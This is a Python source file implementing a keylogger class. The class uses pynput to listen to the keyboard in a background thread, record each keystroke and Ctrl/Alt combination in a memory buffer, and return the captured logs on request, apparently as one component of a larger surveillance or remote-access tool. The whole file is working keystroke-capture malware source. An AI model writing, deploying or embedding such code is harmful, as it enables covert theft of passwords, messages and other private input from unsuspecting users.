import io
import threading
from pynput import keyboard


class Keylogger:
    def __init__(self):
        self._buffer = io.BytesIO()
        self._ctrl_state = False
        self._alt_state = False
        self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}

    def start(self) -> None:
        def start_keylogger():
            with keyboard.Listener(
                on_press=self._on_press, on_release=self._on_release
            ) as listener:
                listener.join()

        threading.Thread(target=start_keylogger).start()

    def _on_press(self, key: keyboard.Key) -> None:
        pressed = None
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = True
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = True
        else:
            if hasattr(key, "char") and hasattr(key, "vk"):
                if self._ctrl_state or self._alt_state:
                    pressed = f"[{'CTRL+' if self._ctrl_state else ''}{'ALT+' if self._alt_state else ''}{chr(key.vk)}]"
                else:
                    pressed = key.char
            else:
                pressed = self._key_map.get(
                    key.name.split("_")[0], f"[{key.name.split('_')[0]}]"
                ).upper()
            if pressed:
                self._buffer.write(pressed.encode("utf-8"))

    def _on_release(self, key: keyboard.Key) -> None:
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = False
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = False

    def get_size(self) -> int:
        """Return the size of the current keylog buffer in Bytes

        Returns:
            int: Size of the current keylog buffer in Bytes
        """
        return self._buffer.tell()

    def get_logs(self) -> bytes:
        """Return the data held within the keylog buffer

        Returns:
            bytes: Keylog data in Byte form
        """
        return self._buffer.getvalue()
